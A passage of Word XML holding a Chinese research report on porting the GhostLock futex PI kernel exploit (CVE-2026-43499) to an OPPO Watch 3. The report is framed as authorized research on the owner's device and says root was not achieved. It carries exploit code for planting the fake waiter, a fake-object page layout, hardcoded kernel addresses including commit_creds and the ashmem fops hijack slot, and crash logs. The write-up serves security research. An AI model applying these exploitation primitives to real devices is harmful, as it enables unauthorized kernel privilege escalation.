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color w:val="1F3B63"/>
          <w:sz w:val="32"/>
        </w:rPr>
        <w:t>GhostLock（CVE-2026-43499）在 OPPO Watch 3（OWW212，ARM32 / Linux 5.4.134）上的移植与利用可行性研究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作者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：Qoder（研究协助）／设备所有者本人（授权安全研究）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目标设备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：OPPO Watch 3，型号 OWW212，序列号 688e2740（自有设备）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固件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：OWW212_11_A.142，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Linux 5.4.134-perf-00522-gb29f81177a79 SMP PREEMPT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实验数据采集日期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：2026-10-11（本机时钟），报告撰写日期：2026-10-14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研究性质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：内核权限提升漏洞的跨架构移植与逐位验证；</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:i w:val="0"/>
          <w:strike w:val="0"/>
          <w:rFonts w:eastAsia="宋体" w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t>非破坏性、可恢复（硬复位）探针</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="黑体"/>
          <w:color w:val="1F3B63"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t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（在 Word 中右键此处 → 更新域，即可生成目录）</w:t>
      </w:r>
      <w:r>
        <w:fldChar w:fldCharType="end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摘要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本研究将 2026 年公开的 Linux futex 优先级继承（PI）requeue 路径栈上使用后释放（UAF）漏洞 CVE-2026-43499（俗称 GhostLock，原始 PoC 面向 ARM64/4.14 平台）移植到一款 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:i w:val="0"/>
          <w:strike w:val="0"/>
          <w:rFonts w:eastAsia="宋体" w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t>无 root、Bootloader 锁定、SELinux Enforcing、无 KASLR 的 ARM32（armv7l）智能手表内核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（Qualcomm W5+ Gen 1 "MONACO"，Linux 5.4.134-perf）。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工作分为四层：（1）从设备 OTA 包中离线抽取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Image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内嵌的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CONFIG_KALLSYMS_ALL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符号表，重建与运行内核完全一致的 System.map，从而把所有结构偏移与函数地址"烘焙"进目标头文件；（2）用 KernelSnitch 风格的 hsearch 哈希碰撞探针在 ARM32/FLATMEM 上完成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mm_struct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泄露，获得一个</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:i w:val="0"/>
          <w:strike w:val="0"/>
          <w:rFonts w:eastAsia="宋体" w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t>已知可读可写的 4 KiB 内核页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；（3）构造"幽灵 waiter"（在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futex_lock_pi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EDEADLK 错误路径上遗留的悬垂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），并证明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clock_adjtime()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copy_from_user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窗口可以精确重写该栈帧；（4）把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rt_mutex_adjust_prio_chain()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的整条走链在真实设备反汇编层面建模，设计"安全页"（walksafe）使走链在不产生非预期写的前提下完成</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:i w:val="0"/>
          <w:strike w:val="0"/>
          <w:rFonts w:eastAsia="宋体" w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t>一次可控单次写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本文的核心实证贡献是一次</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:i w:val="0"/>
          <w:strike w:val="0"/>
          <w:rFonts w:eastAsia="宋体" w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t>指纹探针实验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clock_adjtime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缓冲区的每个字写成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0x100+4w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，随后内核Oops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 = 0x12c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，由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_raw_spin_trylock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解引用。该单一观测同时证明了"写窗口确实落在幽灵 waiter 上"与"waiter 基址偏移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W_BASE = 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（与静态帧深度推导完全一致）"，把此前只能靠"没panic"猜测的几何问题变成了可判定问题。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当前状态（诚实结论）：设备尚未取得 root，`id -u` 仍为 2000。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走链在实机上确实被触发并抵达步骤 [5]（自旋锁 trylock），但一旦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被植成我方页内合法地址，设备表现为</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:i w:val="0"/>
          <w:strike w:val="0"/>
          <w:rFonts w:eastAsia="宋体" w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t>静默挂死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而非 Oops：约 15 s 后由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CONFIG_QCOM_SOC_WATCHDOG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BARK_TIME=15000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）硬复位，且 pstore 内容逐字节不变。本文给出该现象的主假说（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_raw_spin_trylock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失败后进入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cpu_relax(); goto retry;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无穷循环，根因可能是页在 PREP 与 punch 之间约 8 s 的间隔中被回收）以及一套可判读的定位实验（毒字阶梯）。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关键词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：CVE-2026-43499；GhostLock；futex PI；rt_mutex；使用后释放；ARM32；KernelSnitch；kallsyms 离线抽取；OPPO Watch 3；无 KASLR；QCOM SoC watchdog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1 引言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1.1 背景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智能手表厂商普遍使用深度裁剪的 Linux 5.4 LTS 内核，其安全更新周期远落后于主线。GhostLock 类漏洞的价值在于：它只需要</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:i w:val="0"/>
          <w:strike w:val="0"/>
          <w:rFonts w:eastAsia="宋体" w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t>普通应用/adb shell 权限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（本例 uid=2000，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CapEff=0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），且触发原语是 POSIX 线程优先级继承这一所有 Android 设备都启用的功能（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CONFIG_FUTEX_PI=y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在 ARM64/4.14 平台上，同类利用已有公开实现（作者参考了 PCKM00 端口的既有设计）。但 ARM32 + 5.4 + 无 KASLR + 高通 MONACO 这一组合带来若干实质性差异：结构体尺寸不同、红黑树颜色位的编码方向、厂商在关键比较处插入的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udf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硬加固、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CONFIG_CPU_SW_DOMAIN_PAN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使任何用户态地址都不能被内核解引用，以及</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:i w:val="0"/>
          <w:strike w:val="0"/>
          <w:rFonts w:eastAsia="宋体" w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t>完全没有 LOCKUP_DETECTOR/HUNG_TASK/PSTORE_CONSOLE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，使得失败表现为无日志的静默复位。本文的绝大部分篇幅用于把这些差异逐一实测封闭。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1.2 研究范围与硬性约束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本研究的边界由设备所有者的安全底线决定，且在整个实验过程中未被违反：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Bootloader 保持锁定，绝不执行任何解锁操作。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在该平台上解锁被判定为 fastboot 不可逆的变砖事件（无法回刷），因此任何"需要解锁"的路线（包括但不限于修改 boot 镜像、刷入自定义 recovery）都被排除。允许的唯一"损失"是内核 panic/看门狗导致的重启——因为它们可通过回刷官方固件恢复。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仅针对</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:i w:val="0"/>
          <w:strike w:val="0"/>
          <w:rFonts w:eastAsia="宋体" w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t>自有设备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；所有探针都设计为在失败时退化为一次重启。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不使用错误版本固件的符号（A.90 的 blob 曾被拒绝）：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版本横幅（banner）是符号有效性的唯一闸门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结构偏移以设备自身配置（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/proc/config.gz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autoconf.h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）与设备自身内核镜像的 kallsyms 为准；公版 5.4 源码仅用于理解语义与函数内部流程。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不擅自恢复出厂设置/擦除用户数据。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1.3 主要贡献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可迁移的离线符号重建方法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：从 OTA 全量包 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boot.img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Image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CONFIG_KALLSYMS_BASE_RELATIVE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格式的 kallsyms 抽取，得到与运行内核逐字节一致的 System.map；并用"三方一致"（离线映射 ↔ 烘焙常量 ↔ 设备运行时日志）交叉校验。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ARM32 栈帧几何的决定性测量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：指纹探针（fingerprint probe）把"写窗口与幽灵 waiter 的相对位置"从假设变为单次可判读实验，实测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W_BASE = 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，并给出幽灵地址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stack_top − 320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的可复现性。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走链的指令级控制流建模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rt_mutex_adjust_prio_chain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c0196c4c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）在 A.142 上的 24 个关键基本块与作者构造的假对象页对应起来，明确指出 trylock 失败分支即死循环风险点。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静默失败的分类学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：建立"Oops 必留 ramoops、挂死不留"的判别法，用 pstore 的 md5 不变 + dropbox 无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SYSTEM_LAST_KMSG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+ 15 s 复位时间三个独立信号区分两类死亡。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一份完整的负结果记录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：包括被否证的假说（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W_BASE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错配、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GHOSTLOCK_STACK_PAD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有效、写目标选择是致命因素），这些假说的否证过程本身就是方法学贡献。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1.4 结论先行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截至本报告：漏洞可达性（触发、UAF 成形、写窗口命中、走链启动）已</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:i w:val="0"/>
          <w:strike w:val="0"/>
          <w:rFonts w:eastAsia="宋体" w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t>全部实证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；单次可控写的落地尚未成功，障碍收敛到走链中段的一个挂死点。第 10 节给出可判读的单步定位方案。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2 目标平台与安全缓解实测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2.1 设备与运行环境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项目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实测值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获取方式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型号/硬件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OWW212，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Qualcomm Technologies, Inc. MONACO (Flattened Device Tree)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ramoops 中的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Hardware name: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行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SoC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Snapdragon W5+ Gen 1，8 CPU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sysconf(_SC_NPROCESSORS_ONLN) = 8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架构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ARMv7（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CONFIG_CPU_V7=y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，ARM 指令集，非 THUMB2）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+ Oops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Mode SVC_32 ISA ARM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内核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5.4.134-perf-00522-gb29f81177a79 #1 PREEMPT SMP ARM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uname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ramoops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固件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OWW212_11_A.142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ro.build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属性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进程上下文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uid=2000 gid=2000 euid=2000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attr=u:r:shell:s0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enforce=1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探针启动自检日志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能力/沙箱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NoNewPrivs=0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Seccomp=0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（adb shell 域无 seccomp）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启动自检日志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dm-verity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关闭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分区状态检查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地址布局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PAGE_OFFSET=0xC0000000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（VMSPLIT_3G）、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PHYS_OFFSET=0x80000000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_text=0xC0008000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_stext=0xc0100000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镜像 +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p0 profile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日志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ADB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C:\platform-tools\adb.exe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，设备序列号 688e2740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2.2 与利用直接相关的内核配置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配置项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取值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对本利用的含义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CONFIG_FUTEX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CONFIG_FUTEX_PI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 / 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漏洞入口存在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CONFIG_RT_MUTEXES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y（隐含）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PI 走链可达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CONFIG_DEBUG_RT_MUTEXES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未设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waiter 无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wake_state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字段在 +0x1c（若开启则布局不同）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CONFIG_KALLSYMS_ALL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CONFIG_KALLSYMS_BASE_RELATIVE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 / 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离线抽取符号表的依据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KASLR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不存在（镜像不可重定位）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所有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.text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.data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地址为常量，跳过 slide 阶段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CONFIG_CPU_SW_DOMAIN_PAN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禁止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用用户态地址充当伪造内核指针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CONFIG_STRICT_KERNEL_RWX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表在只读段，只能改指针不能改代码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CONFIG_STACKPROTECTOR_STRONG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与本研究无直接阻断：破坏目标是栈上的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数据结构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，不越过 canary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CONFIG_CGROUP_SCHED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CONFIG_UCLAMP_TASK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 / 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提供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sched_setattr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+ util-clamp 这一"prio 恒定"的重复走链触发器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CONFIG_LOCKUP_DETECTOR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SOFTLOCKUP_DETECTOR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HUNG_TASK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未设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挂死不产生任何日志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CONFIG_PSTORE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PSTORE_RAM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 / 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dmesg-ramoops-0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跨重启保留完整 dmesg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CONFIG_PSTORE_CONSOLE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未设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实时 console 不落 pstore，只能看崩溃前已写入的环形缓冲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CONFIG_QCOM_SOC_WATCHDOG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QCOM_WATCHDOG_BARK_TIME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y / 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15000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挂死 → 15 s 后硬复位，且无 pstore 记录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CONFIG_ASHMEM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hijack 候选槽位（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misc-&gt;fops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CONFIG_BUG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y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udf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加固指令可被用作故障定位信标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2.3 无 KASLR 的战术含义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无 KASLR 带来两个相反方向的影响。有利的一面：所有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.data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目标（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sysctl_optmem_max = 0xc1a08a04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ashmem_misc = 0xc1aa8808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console_printk = 0xc1a1d174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init_task = 0xc1a112c0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）在编译期即为常量，无需任何基址泄露即可精确瞄准；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commit_creds = 0xc0148c60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prepare_kernel_cred = 0xc0148fe4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同理。不利的一面：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任何一次瞄准错误的写都会命中真实且重要的内核数据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，容错窗口比有 KASLR 的平台更小，因此本工作把"先证明走链路径可控，再落地真实写"作为强制次序。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3 漏洞原理：CVE-2026-43499 与"幽灵 waiter"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3.1 机理概述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futex_lock_pi()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在获取 rt_mutex 失败并需要走 PI（优先级继承）路径时，会在</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:i w:val="0"/>
          <w:strike w:val="0"/>
          <w:rFonts w:eastAsia="宋体" w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t>调用者的内核栈上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分配一个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struct rt_mutex_waiter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，把它挂入锁的 waiters 树，并记录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current-&gt;pi_blocked_on = &amp;waiter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。在特定的错误返回路径（本例经由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futex_requeue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引发的 EDEADLK 自锁检测）上，内核会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remove_waiter()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释放栈上 waiter 并</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:i w:val="0"/>
          <w:strike w:val="0"/>
          <w:rFonts w:eastAsia="宋体" w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t>返回错误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，但作者观测到的行为是：该错误路径清理的是</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:i w:val="0"/>
          <w:strike w:val="0"/>
          <w:rFonts w:eastAsia="宋体" w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t>重排队方（requeue 发起者）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的 waiter，而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current-&gt;pi_blocked_on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仍指向上一次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futex_lock_pi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已经随栈帧弹出而失效的 waiter 对象。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于是得到一个悬垂指针型 UAF：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task-&gt;pi_blocked_on  ──►  （已弹出的内核栈区域，可被后续任意系统调用复用写入）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任何后续调用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rt_mutex_adjust_pi(task)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rt_mutex_setprio()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的代码路径都会</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:i w:val="0"/>
          <w:strike w:val="0"/>
          <w:rFonts w:eastAsia="宋体" w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t>解引用这个悬垂指针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，并把栈上那块内存当作合法的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rt_mutex_waiter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使用。若攻击者能在解引用之前把该内存内容改写为自己构造的 waiter，就得到"以攻击者选择的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waiter-&gt;tree_entry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进入走链"的强原语——这正是单次任意写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*(W) = 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的入口。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3.2 本实现的触发序列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线程 owner  : FUTEX_LOCK_PI 持有 pi_lock（rt_mutex A）</w:t>
        <w:br/>
        <w:t>线程 route  : FUTEX_LOCK_PI 阻塞在 A 上，其栈帧内出现 waiter W_A，</w:t>
        <w:br/>
        <w:t xml:space="preserve">              task-&gt;pi_blocked_on = &amp;W_A</w:t>
        <w:br/>
        <w:t>requeue     : 对 route 所在线程组执行 FUTEX_REQUEUE/CMPReQUEUE，</w:t>
        <w:br/>
        <w:t xml:space="preserve">              使 PI 链在自锁检测处返回 -EDEADLK，</w:t>
        <w:br/>
        <w:t xml:space="preserve">              route 的 futex_lock_pi 提前退出，栈帧弹出，</w:t>
        <w:br/>
        <w:t xml:space="preserve">              但 owner task 的 pi_blocked_on 悬垂指向 &amp;W_A 的原位置</w:t>
        <w:br/>
        <w:t>ghost 形成  : 此后任何 rt_mutex_adjust_pi(owner) 都会读那块栈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实机证据（每次 fire 均稳定复现，摘录自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captures/wsself.log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[16:29:40.668] REQUEUE-PI ret=-1 errno=35 (EDEADLK: ghost pi_blocked_on formed)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errno = 35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即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EDEADLK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，返回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-1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说明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futex_lock_pi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正是在 PI 自锁检测失败的错误路径上退出——这是"幽灵已经成形"的正向信号，而不是失败信号。任何一次 fire 若没有这一行，就说明 UAF 前提根本没建立，后续全部实验无意义。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3.3 punch（走链触发器）的选择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需要" prio 恒定、可重复、不产生睡眠"的走链触发器。本实现使用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sched_setattr()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CONFIG_UCLAMP_TASK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util-clamp 修改：它会让目标 task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保持不变（120），却仍调用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rt_mutex_adjust_pi()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，从而：</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet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每次 punch 都走到同一条分支（可重复）；</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet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不会唤醒/阻塞目标线程，不引入额外调度噪声；</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet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与旧式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setpriority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触发相比，避免了 prio 抖动导致的分支发散。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日志证据：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PUNCH-TGT mode=waiter tid=8191 waiter=8191 owner=8192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，以及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TARGET-PRE a=1 tid=8191 prio=120 nice=0 plant_val=120 auto=1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4 ARM64/4.14 → ARM32/5.4 的移植差异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维度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ARM64 参考实现（PCKM00, 4.14）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本研究（OWW212, 5.4 ARM32）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后果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指针宽度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8 字节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4 字节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所有偏移/布局重算；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rb_node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12 字节而非 24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rt_mutex_waiter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含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wake_state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ww_ctx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（5.5+）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无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，尺寸 0x30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task@0x18 lock@0x1c prio@0x20 deadline@0x28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rbtree 颜色位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同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同，但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方向反直觉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RB_RED=0, RB_BLACK=1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rbtree_augmented.h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早期所有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entree base&lt;=2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的失败源于此：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pc=0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被当作 RED，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__rb_insert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取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gparent = pc &amp; ~3 = NULL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并解引用 → 必崩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厂商加固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无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c019718c / c0197194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处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udf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断言（waiter-&gt;lock 一致性）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必须让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waiter-&gt;lock == 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，且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fake_w0-&gt;lock == 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才能绕过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用户地址隔离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PAN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CONFIG_CPU_SW_DOMAIN_PAN=y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伪造指针必须是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内核地址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（只能用泄露页）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KASLR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有（需 slide 泄露）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无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跳过 slide；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.data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地址常量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slab/回收对象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mm_struct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order-3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mm_struct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size 0x200、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order-0、objs_per_slab=8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全部伪造对象必须压进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同一个 4 KiB 页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thread_info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在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task_struct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内（THREAD_INFO_IN_TASK=y）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不在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task 内，位于栈底（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task-&gt;stack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走链若进入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__task_rq_lock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会读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p-&gt;stack-&gt;cpu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stack=0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必崩，故指向页内零字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挂死可观测性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LOCKUP_DETECTOR 通常开启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全关 + SoC 看门狗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失败模式退化为"无日志复位"，需新判别法（§9）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4.1 伪造页内布局（`target.h`，单页 4 KiB）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payload_base + 0x0000 : fake_task（task_struct 前若干字段的切片）</w:t>
        <w:br/>
        <w:t>payload_base + 0x0600 : fake_w0（第二个 waiter，树形关系的载体）</w:t>
        <w:br/>
        <w:t>payload_base + 0x0700 : fake_lock（rt_mutex：wait_lock@0, waiters@4/8, owner@0xc）</w:t>
        <w:br/>
        <w:t>payload_base + 0x0800 : right node（rb_node）</w:t>
        <w:br/>
        <w:t>payload_base + 0x0900 : left node（rb_node）</w:t>
        <w:br/>
        <w:t>payload_base + 0x0A00 : fake file_operations 表（约 0x100 字节）</w:t>
        <w:br/>
        <w:t>payload_base + 0x0E00 : SCRATCH（用作 fake_task-&gt;stack 等"读零"用途）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因为泄露对象是 order-0 slab，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payload_base = leaked_mm &amp; ~0xFFF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是唯一</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:i w:val="0"/>
          <w:strike w:val="0"/>
          <w:rFonts w:eastAsia="宋体" w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t>已知被完全控制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的页，所有结构必须自洽地落在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[payload_base, payload_base+0x1000)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4.2 一处重要更正：`task-&gt;pi_lock` / `pi_blocked_on` 的真实偏移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target.h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FAKE_TASK_PI_LOCK_OFF=0x570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FAKE_TASK_PI_BLOCKED_ON_OFF=0x584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是沿袭 ARM64/5.10 推导的</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:i w:val="0"/>
          <w:strike w:val="0"/>
          <w:rFonts w:eastAsia="宋体" w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t>陈旧常量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。设备反汇编给出实测值：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c0196d84  ldr r6, [r4, #0x6c8]      ; r4 = task, r6 = task-&gt;pi_blocked_on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并在两次独立 Oops 的寄存器组中得到交叉验证：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r4 = 0xd9959000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（task 基址）、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r7 = 0xd99596b4 = r4 + 0x6b4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&amp;task-&gt;pi_lock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r6 = 0xc4b25ec0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（waiter 指针）。因此本研究的活路径使用 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:i w:val="0"/>
          <w:strike w:val="0"/>
          <w:rFonts w:eastAsia="宋体" w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t>0x6b4 / 0x6c8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。该更正只影响读侧（走链自己取字段），不影响假页里给走链看的字段——但任何后续把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当作可写槽位的做法都必须用 0x6c8。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5 内核基址与对象泄露（KernelSnitch 风格）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5.1 原理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task_struct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泄露的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task-&gt;mm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指针通过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clone()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子进程继承关系在多进程间复制，利用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hsearch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（glibc）哈希表的插入顺序与地址高位可构造碰撞，进而用子进程的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mm-&gt;mmap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等字段读取"同一 slab 上其他对象"的内容，最终在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[0xC0000000, 0xF0000000)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的低映射窗口内定位一个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mm_struct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5.2 实测参数与日志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在 ARM32 上重算的关键参数（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[*] parameters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行）与命中结果：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[16:29:38.197] [*] parameters cpu (8) mm_struct sz (200) mm slab order (0)</w:t>
        <w:br/>
        <w:t xml:space="preserve">                          thread cnt (4) collisions (4) mte disabled</w:t>
        <w:br/>
        <w:t>[16:29:38.687] [*] start finding collisisons</w:t>
        <w:br/>
        <w:t>[16:29:38.694] [*] target    b65890a4</w:t>
        <w:br/>
        <w:t>[16:29:38.902] [*]   b1ede8a8</w:t>
        <w:br/>
        <w:t>[16:29:39.866] [*]   b25acf18</w:t>
        <w:br/>
        <w:t>[16:29:40.125] [*]   b2744bd8</w:t>
        <w:br/>
        <w:t>[16:29:40.131] [*] found 3 collisisons</w:t>
        <w:br/>
        <w:t>[16:29:40.434] [*] [  0] HIT model=1 hsz=256 mm=c4344600</w:t>
        <w:br/>
        <w:t>[16:29:40.444] PREP base=c4344000 objs_per_slab=8 prepare=256 spray=48</w:t>
        <w:br/>
        <w:t xml:space="preserve">                  pre=7 post=8 leaked_mm=c4344600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其中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HIT model=1 hsz=256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是泄露模型收敛的判据（与先前记忆一致：mainline hash 模型=1、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futex_hashsize=256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步长 0x200）。多个实验日期的 ghost/页地址均显示该阶段稳定成功。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泄露成功后，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payload_base = c4344000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（页对齐），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fake_task = c4344000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 = c4344700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 = c4344a00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——三者全在同一受控页内。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6 写原语：`clock_adjtime(405)` 的用户→内核栈复制窗口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6.1 帧深度分析（离线，基于 `Image.a142`）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sys_clock_adjtime  = 0xc01d34a4 : 帧大小 248 字节，`struct timex ktx` 位于 sp+0</w:t>
        <w:br/>
        <w:t>copy_from_user(&amp;ktx, utx, sizeof(ktx)=0xd0=208) 发生在任何回调之前</w:t>
        <w:br/>
        <w:t>clockid = 12345 &gt;= MAX_CLOCKS(16) → clockid_to_kclock() 返回 NULL</w:t>
        <w:br/>
        <w:t xml:space="preserve">        → do_clock_adjtime() 立即返回 -EINVAL：</w:t>
        <w:br/>
        <w:t xml:space="preserve">          * 不调用任何 k_clock 回调</w:t>
        <w:br/>
        <w:t xml:space="preserve">          * 更关键的是它在 copy_to_user 回写之前就返回，</w:t>
        <w:br/>
        <w:t xml:space="preserve">            因此轮询 405 期间不会再有第二次触碰用户缓冲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于是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ktx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208 字节全部为用户可控内容，落在相对系统调用入口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的深度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[40, 248)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。幽灵 waiter（12 个字，word0 在最深 232）位于深度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[184, 232)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，覆盖判据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 ≥ 232 且 D − L ≤ 184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成立（248 ≥ 232，248 − 208 = 40 ≤ 184）。字对应关系：waiter 第 k 字在深度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232 − 4k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，ktx 第 j 字在深度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248 − 4j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，故 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:i w:val="0"/>
          <w:strike w:val="0"/>
          <w:rFonts w:eastAsia="宋体" w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t>ktx 字 (4 + k) == waiter 字 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，即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W_BASE = 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（静态预测）。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6.2 植字代码（`exploit/src/fops.c`，walksafe 模式）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/* 每个 punch 前由 prepare_adjtime_buf() 重排 buf[]，随后 405 轮询把</w:t>
        <w:br/>
        <w:t xml:space="preserve"> * buf 复制进内核栈，覆盖幽灵 waiter 的 12 个字。 */</w:t>
        <w:br/>
        <w:t>adjtime_put_global_word(buf, wbase + WT_W_TREE_PC, w - 4);  /* tree.parent_color */</w:t>
        <w:br/>
        <w:t>adjtime_put_global_word(buf, wbase + WT_W_TREE_R , v     ); /* tree.rb_right      */</w:t>
        <w:br/>
        <w:t>adjtime_put_global_word(buf, wbase + WT_W_TREE_L , 0     ); /* tree.rb_left       */</w:t>
        <w:br/>
        <w:t>adjtime_put_global_word(buf, wbase + WT_W_PI_PC  , 0     ); /* pi_tree.*  —— owner==0 时 [11] 不执行 */</w:t>
        <w:br/>
        <w:t>adjtime_put_global_word(buf, wbase + WT_W_PI_R   , 0     );</w:t>
        <w:br/>
        <w:t>adjtime_put_global_word(buf, wbase + WT_W_PI_L   , 0     );</w:t>
        <w:br/>
        <w:t>adjtime_put_global_word(buf, wbase + WT_W_TASK   , fake_task );  /* 仅供被刻意绕开的 wake_up_process */</w:t>
        <w:br/>
        <w:t>adjtime_put_global_word(buf, wbase + WT_W_LOCK   , fake_lock );  /* 必须 == fake_lock，否则 udf 加固触发 */</w:t>
        <w:br/>
        <w:t>adjtime_put_global_word(buf, wbase + WT_W_PRIO   , 0     );      /* 0 =&gt; 必不等(120/139) =&gt; 走链真的执行 */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目标选择（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GHOSTLOCK_WS_TARGET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）三选一：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self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（写落在自家页内，纯路径验证）、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oracle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（写落在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sysctl_optmem_max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，可用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/proc/sys/net/core/optmem_max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读回做正向验证）、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（写落在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ashmem_misc.fops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，即真正的 hijack 槽位）。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轮询循环本身保证"植物新鲜度"：在 punch 之前，同一缓冲区每约 0.3 µs 重新复制一次，因此幽灵区域的内容在 punch 瞬间必然等于我方最后一次写入。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7 几何测量：指纹探针实验（本研究最关键的一次实证）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7.1 方法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把整个用户缓冲写成自带地址信息的等差数列，使内核 Oops 的寄存器值直接"报出"被读到的是第几个字：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if (env_flag("GHOSTLOCK_PATTERN", 0)) {</w:t>
        <w:br/>
        <w:t xml:space="preserve">  for (int w = 0; w &lt; ADJTIME_TIMEX_WORDS; w++)   /* 52 words */</w:t>
        <w:br/>
        <w:t xml:space="preserve">    buf[w] = (uint32_t)(0x100 + 4 * w);</w:t>
        <w:br/>
        <w:t xml:space="preserve">  return;</w:t>
        <w:br/>
        <w:t>}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这个构造的好处是</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:i w:val="0"/>
          <w:strike w:val="0"/>
          <w:rFonts w:eastAsia="宋体" w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t>非破坏性自解释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：任何被内核当作指针使用的值都能反解出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 = (v − 0x100)/4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7.2 观测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&lt;1&gt;[  827.728855] Unable to handle kernel NULL pointer dereference at virtual address 0000012c</w:t>
        <w:br/>
        <w:t>&lt;0&gt;[  827.728871] Internal error: Oops: 5 [#1] PREEMPT SMP ARM</w:t>
        <w:br/>
        <w:t>&lt;4&gt;[  827.728915] CPU: 1 PID: 8370 Comm: toybox Tainted: G        W  O   5.4.134-perf-00522-gb29f81177a79 #1</w:t>
        <w:br/>
        <w:t>&lt;4&gt;[  827.728918] Hardware name: Qualcomm Technologies, Inc. MONACO (Flattened Device Tree)</w:t>
        <w:br/>
        <w:t>&lt;4&gt;[  827.728928] PC is at _raw_spin_trylock+0x20/0x90</w:t>
        <w:br/>
        <w:t>&lt;4&gt;[  827.728935] LR is at rt_mutex_adjust_prio_chain+0x120/0x558</w:t>
        <w:br/>
        <w:t>&lt;4&gt;[  827.728949] r7 : e1ff96b4  r6 : c7e19ec0  r5 : 0000012c  r4 : e1ff9000</w:t>
        <w:br/>
        <w:t>&lt;4&gt;[  827.728953] r3 : 00000000  r2 : c7c14004  r1 : 00000003  r0 : 0000012c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对应的用户侧日志（同一次 fire）：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[16:10:49.423] PRE-ATDFI a=1 wbase=0 mode=000 probe=-9,-9 val=120 plant=0 pad=0 ...</w:t>
        <w:br/>
        <w:t xml:space="preserve">              buf[wbase+0..8]=00000100 00000104 00000108 0000010c 00000110</w:t>
        <w:br/>
        <w:t xml:space="preserve">                              00000114 00000118 0000011c 00000120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7.3 推导（一步一果）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 = 0x12c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，而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0x12c = 0x100 + 4·11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→ 内核读到的是 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:i w:val="0"/>
          <w:strike w:val="0"/>
          <w:rFonts w:eastAsia="宋体" w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t>`buf[11]`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。这是我方写入的指纹值本身，证明"内核读到的内存 = 我方刚复制进去的内容"。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走链在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c0196d64 mov r0, r5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之前已经把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设为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，因此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字段与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buf[11]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重合，即 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:i w:val="0"/>
          <w:strike w:val="0"/>
          <w:rFonts w:eastAsia="宋体" w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t>`addr(buf[11]) = ghost + 0x1c`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于是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addr(buf[0]) = ghost − 0x10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addr(buf[4]) = ghost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  <w:r>
        <w:rPr>
          <w:b/>
          <w:i w:val="0"/>
          <w:strike w:val="0"/>
          <w:rFonts w:eastAsia="宋体" w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
